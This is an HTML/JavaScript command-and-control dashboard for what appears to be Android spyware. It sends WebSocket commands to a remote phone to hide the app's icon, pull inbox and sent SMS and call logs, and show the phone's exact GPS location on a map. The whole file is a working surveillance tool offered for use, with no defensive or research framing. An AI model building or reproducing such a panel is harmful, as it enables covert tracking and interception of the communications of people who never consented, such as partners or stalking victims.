<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Device Command Center</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #121212; color: #e0e0e0; margin: 0; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
        
        /* HEADER */
        .header { background: #1e1e1e; padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #333; }
        .status-badge { padding: 5px 12px; border-radius: 15px; font-weight: bold; font-size: 0.9em; }
        .online { background: #1b5e20; color: #a5d6a7; }
        .offline { background: #b71c1c; color: #ef9a9a; }
        .net-info { font-family: monospace; color: #64b5f6; }

        /* MAIN LAYOUT */
        .main-container { display: flex; flex: 1; height: 100%; }
        
        /* CONTROLS (Left) */
        .controls-panel { width: 300px; background: #1e1e1e; padding: 20px; overflow-y: auto; border-right: 1px solid #333; }
        .btn-group { margin-bottom: 20px; }
        .btn-group h3 { margin-top: 0; color: #90caf9; font-size: 1em; border-bottom: 1px solid #444; padding-bottom: 5px; }
        button { width: 100%; padding: 10px; margin-bottom: 8px; background: #333; color: white; border: none; border-radius: 4px; cursor: pointer; transition: 0.2s; text-align: left; }
        button:hover { background: #444; }
        button:active { background: #555; }
        .btn-danger { background: #5a1a1a; }

        /* OUTPUT BOX (Right - "Mobile View") */
        .output-panel { flex: 1; background: #000; padding: 20px; display: flex; justify-content: center; align-items: center; }
        .mobile-frame { width: 360px; height: 640px; background: #121212; border: 10px solid #333; border-radius: 20px; overflow: hidden; display: flex; flex-direction: column; position: relative; }
        .mobile-header { background: #222; padding: 10px; text-align: center; font-weight: bold; border-bottom: 1px solid #444; }
        .mobile-content { flex: 1; overflow-y: auto; padding: 10px; font-size: 0.9em; }
        
        /* DATA STYLES */
        .data-card { background: #222; padding: 10px; margin-bottom: 10px; border-radius: 5px; border-left: 3px solid #64b5f6; }
        .data-card div { margin-bottom: 3px; }
        .label { color: #888; font-size: 0.8em; }
        
        /* MAP STYLES */
        #map { height: 100%; width: 100%; }
        .gps-info { position: absolute; top: 0; left: 0; width: 100%; background: rgba(0,0,0,0.8); padding: 10px; z-index: 999; font-size: 0.8em; }

    </style>
</head>
<body>

    <div class="header">
        <div class="status-badge offline" id="connectionStatus">DEVICE: OFFLINE</div>
        <div class="net-info" id="networkInfo">WAITING FOR NETWORK DATA...</div>
    </div>

    <div class="main-container">
        <div class="controls-panel">
            <div class="btn-group">
                <h3>App Management</h3>
                <button onclick="sendCommand('hideApp')">Hide App Icon</button>
                <button onclick="sendCommand('showApp')">Show App Icon</button>
            </div>
            
            <div class="btn-group">
                <h3>Communications</h3>
                <button onclick="sendCommand('getSMS inbox')">Get Inbox SMS</button>
                <button onclick="sendCommand('getSMS sent')">Get Sent SMS</button>
                <button onclick="sendCommand('getCallLogs')">Get Call Logs</button>
            </div>

            <div class="btn-group">
                <h3>Tracking</h3>
                <button onclick="sendCommand('getLocation')">Get Exact GPS Location</button>
            </div>
        </div>

        <div class="output-panel">
            <div class="mobile-frame">
                <div class="mobile-header" id="outputHeader">Output View</div>
                <div class="mobile-content" id="outputContent">
                    <div style="text-align: center; color: #555; margin-top: 50%;">Select an option from the control panel to view data.</div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    
    <script>
        const ws = new WebSocket("wss://" + window.location.host); // Connect to your server
        let mapInstance = null;

        ws.onmessage = (event) => {
            const msg = event.data;

            if (msg.startsWith("STATUS:")) {
                const status = msg.split(":")[1];
                const badge = document.getElementById('connectionStatus');
                badge.className = status === 'ONLINE' ? 'status-badge online' : 'status-badge offline';
                badge.innerText = "DEVICE: " + status;
            }
            else if (msg.startsWith("NET_INFO:")) {
                document.getElementById('networkInfo').innerText = msg.split(":")[1];
            }
            else if (msg.startsWith("SMS_DATA:")) {
                renderSMS(JSON.parse(msg.substring(9)));
            }
            else if (msg.startsWith("CALL_DATA:")) {
                renderCalls(JSON.parse(msg.substring(10)));
            }
            else if (msg.startsWith("LOC_DATA:")) {
                renderLocation(JSON.parse(msg.substring(9)));
            }
        };

        function sendCommand(cmd) {
            ws.send(cmd);
            document.getElementById('outputContent').innerHTML = '<div style="text-align:center; padding:20px;">Fetching Data...</div>';
        }

        // RENDER SMS
        function renderSMS(data) {
            const container = document.getElementById('outputContent');
            document.getElementById('outputHeader').innerText = "SMS Messages";
            container.innerHTML = "";
            
            data.forEach(sms => {
                const card = document.createElement('div');
                card.className = "data-card";
                card.innerHTML = `
                    <div><span class="label">TYPE:</span> <b>${sms.type}</b></div>
                    <div><span class="label">FROM:</span> ${sms.number}</div>
                    <div><span class="label">MSG:</span> ${sms.content}</div>
                    <div><span class="label">TIME:</span> ${sms.date}</div>
                `;
                container.appendChild(card);
            });
        }

        // RENDER CALLS
        function renderCalls(data) {
            const container = document.getElementById('outputContent');
            document.getElementById('outputHeader').innerText = "Call Logs";
            container.innerHTML = "";

            data.forEach(call => {
                const card = document.createElement('div');
                card.className = "data-card";
                card.innerHTML = `
                    <div><span class="label">TYPE:</span> <b>${call.type}</b></div>
                    <div><span class="label">CONTACT:</span> ${call.number}</div>
                    <div><span class="label">DURATION:</span> ${call.duration}</div>
                    <div><span class="label">TIME:</span> ${call.date}</div>
                `;
                container.appendChild(card);
            });
        }

        // RENDER LOCATION
        function renderLocation(data) {
            const container = document.getElementById('outputContent');
            document.getElementById('outputHeader').innerText = "GPS Tracking";
            container.innerHTML = "";

            if (data.error) {
                container.innerHTML = `<div style="color:red; text-align:center;">${data.error}</div>`;
                return;
            }

            // Create Info Header
            const infoDiv = document.createElement('div');
            infoDiv.className = 'gps-info';
            infoDiv.innerHTML = `
                <div><b>LAT:</b> ${data.lat}</div>
                <div><b>LON:</b> ${data.lon}</div>
                <div><b>ACCURACY:</b> ${data.acc} meters</div>
            `;
            container.appendChild(infoDiv);

            // Create Map Container
            const mapDiv = document.createElement('div');
            mapDiv.id = "map";
            container.appendChild(mapDiv);

            // Initialize Map
            setTimeout(() => {
                if (mapInstance) mapInstance.remove();
                mapInstance = L.map('map').setView([data.lat, data.lon], 15);
                
                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                    attribution: 'Â© OpenStreetMap'
                }).addTo(mapInstance);

                // Add Marker
                L.marker([data.lat, data.lon]).addTo(mapInstance)
                    .bindPopup(`Accuracy: ${data.acc}m`).openPopup();

                // Add Accuracy Circle
                L.circle([data.lat, data.lon], {
                    color: 'blue',
                    fillColor: '#30f',
                    fillOpacity: 0.2,
                    radius: data.acc
                }).addTo(mapInstance);
            }, 100);
        }

        // Initial Identity
        ws.onopen = () => ws.send("I_AM_WEB");
    </script>
</body>
</html>
